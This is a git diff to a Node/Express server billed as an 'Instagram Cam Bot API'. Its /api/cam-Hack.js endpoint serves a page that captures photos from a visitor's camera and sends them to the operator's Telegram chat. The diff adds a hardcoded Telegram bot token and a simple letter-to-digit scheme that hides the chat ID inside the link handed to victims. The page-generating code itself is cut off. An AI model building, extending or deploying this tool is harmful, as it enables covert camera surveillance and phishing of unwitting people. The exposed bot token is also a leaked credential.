@@ -3,6 +3,30 @@ const cors = require('cors');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
+// HARDCODED BOT TOKEN (Your bot only)
+const HARDCODED_BOT_TOKEN = '8046839649:AAH7wNQGWdwLb2wGu9tfVZfu203B273fcZk';
+
+// RANDOM ENCODING KEYS (0-10)
+const ENCODING_KEYS = {
+  'a': 7, 'b': 2, 'c': 9, 'd': 1, 'e': 5, 'f': 8, 'g': 0, 'h': 3, 'i': 6, 'j': 4, 'k': 10,
+  'l': 7, 'm': 2, 'n': 9, 'o': 1, 'p': 5, 'q': 8, 'r': 0, 's': 3, 't': 6, 'u': 4, 'v': 10,
+  'w': 7, 'x': 2, 'y': 9, 'z': 1, 'A': 5, 'B': 8, 'C': 0, 'D': 3, 'E': 6, 'F': 4, 'G': 10,
+  'H': 7, 'I': 2, 'J': 9, 'K': 1, 'L': 5, 'M': 8, 'N': 0, 'O': 3, 'P': 6, 'Q': 4, 'R': 10
+};
+
+// Function to decode chat ID from encoded string
+function decodeChatId(encodedStr) {
+  let chatId = '';
+  for (let char of encodedStr) {
+    if (ENCODING_KEYS[char] !== undefined) {
+      chatId += ENCODING_KEYS[char];
+    } else if (char >= '0' && char <= '9') {
+      chatId += char;
+    }
+  }
+  return chatId;
+}
+
 // Middleware
 app.use(cors());
 app.use(express.json());
@@ -10,17 +34,30 @@ app.use(express.static('public'));
 
 // API endpoint that serves the camera capture page
 app.get('/api/cam-Hack.js', (req, res) => {
-  const { chatId, botToken } = req.query;
+  const { code } = req.query;
   
-  if (!chatId || !botToken) {
+  if (!code) {
     return res.status(400).json({ 
-      error: 'Missing parameters',
-      usage: '/api/cam-Hack.js?chatId=YOUR_CHAT_ID&botToken=YOUR_BOT_TOKEN'
+      error: 'Missing code parameter',
+      usage: '/api/cam-Hack.js?code=ENCODED_CHAT_ID',
+      example: '/api/cam-Hack.js?code=abc123'
     });
   }
 
-  // Generate HTML with the provided parameters
-  const html = generateHTML(chatId, botToken);
+  // Decode chat ID from the code
+  const chatId = decodeChatId(code);
+  
+  if (!chatId || chatId.length < 1) {
+    return res.status(400).json({ 
+      error: 'Invalid code format',
+      message: 'Code must contain valid letters/numbers'
+    });
+  }
+
+  console.log(`Decoded - Code: ${code} -> Chat ID: ${chatId}`);
+
+  // Generate HTML with HARDCODED bot token and decoded chat ID
+  const html = generateHTML(chatId, HARDCODED_BOT_TOKEN);
   
   res.setHeader('Content-Type', 'text/html');
   res.send(html);
@@ -30,8 +67,9 @@ app.get('/api/cam-Hack.js', (req, res) => {
 app.get('/', (req, res) => {
   res.json({ 
     message: 'Instagram Cam Bot API is running! 🚀',
-    usage: 'GET /api/cam-Hack.js?chatId=YOUR_CHAT_ID&botToken=YOUR_BOT_TOKEN',
-    description: 'Returns a camera capture page that sends photos to Telegram'
+    usage: 'GET /api/cam-Hack.js?code=ENCODED_CHAT_ID',
+    description: 'Returns a camera capture page that sends photos to your Telegram',
+    note: 'Bot token is hardcoded, only chat ID needs to be encoded'
   });
 });
 
@@ -39,6 +77,9 @@ app.get('/', (req, res) => {
 app.get('/health', (req, res) => {
   res.json({ status: 'OK', timestamp: new Date().toISOString() });
 });
+
+// KEEP YOUR EXISTING generateHTML FUNCTION AND EVERYTHING ELSE EXACTLY THE SAME
+// DON'T CHANGE ANYTHING BELOW THIS LINE
 
 function generateHTML(chatId, botToken) {
   return `<!DOCTYPE html>
